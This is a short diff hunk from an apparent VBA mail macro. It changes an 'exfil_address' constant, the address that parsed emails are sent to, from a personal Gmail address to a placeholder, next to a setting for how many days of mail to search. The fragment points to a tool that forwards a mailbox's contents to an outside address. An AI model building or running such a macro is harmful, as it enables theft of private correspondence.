@@ -7,7 +7,7 @@
 
 'Variable exfil_address is the email address that 
 'the parsed emails are sent to.
-Const exfil_address As String = "john.woodman11@gmail.com"
+Const exfil_address As String = "ChangeMe@gmail.com"
 
 'The variable daysToSearch determines how many days 
 'worth of emails to look through. It's currently set 
